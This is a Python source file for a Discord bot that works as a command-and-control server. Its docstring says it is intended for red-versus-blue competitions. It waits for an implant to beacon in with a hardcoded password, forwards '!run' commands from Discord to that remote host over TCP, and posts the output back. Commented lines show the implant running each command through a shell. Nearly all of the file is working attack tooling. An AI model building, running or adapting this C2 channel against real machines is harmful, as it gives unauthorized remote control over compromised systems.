import socket

import discord
from discord.ext import commands

"""
This program uses discord.py and python networking stuff to note down remote IPs which
will accept commands to be executed then send back the results. It also handles UI on
discord including new channels for commands, a channel for logs, and an overview channel. 

Intended for red vs blue competitions.

Author: Asa Horn
"""

bot = commands.Bot(command_prefix='!')

@bot.command()
async def run(ctx, *args):
    ##################################################input
    cmd = ''
    for bit in args:
        cmd += bit + ' '
    print('USR CMD: ' + cmd)

    ##################################################user input editing
    #todo pull out specific character and replace with password from PPM

    ##################################################directory services
    #todo save directory of last command to enable usage like a shell

    ##################################################send to remote
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #send greeting to command server
        print('Sending command to payload @ ' + remoteAddr[0])
        s.connect((remoteAddr[0], 22705))
        s.sendall(bytes(cmd, 'utf-8'))

        ##this is what the remote payload does
        #command = shlex.split(cmd)
        #process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
        #stdout, stderr = process.communicate()

        data = s.recv(1024)
        stdout = data.decode("utf-8")

    ##################################################discord output
    print('----returns----')
    print(stdout)
    await ctx.send('```' + str(stdout) + '```')


######################################################Command init
def main(*args):
    password = '$$thisPa$_3w0rdSl@ps'
    if password == '':
        if len(args) > 1:
            password = args[1]
        else:
            password = input('Password for beacon: ')

    #for now this just accepts one beacon and then goes to command, this should be a thread so it can accept multiple
    #beacons.
    beacon = 'CONNECT: ' + password
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 22704))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print('Beacon connection from', addr)
            data = conn.recv(1024)
            if data == bytes(beacon, 'utf-8'):
                conn.sendall(b'ACCEPTED')
                print('Authenticated ', addr)
                global remoteAddr
                remoteAddr = addr  # ill fix this in a sec
            else:
                conn.sendall(b'BAD CRED')
                print('Rejected ', addr, '| 10:BAD CRED')

    with open('secrets.txt') as f:
        secret = f.read()
        bot.run(secret)


if __name__ == '__main__':
    main()
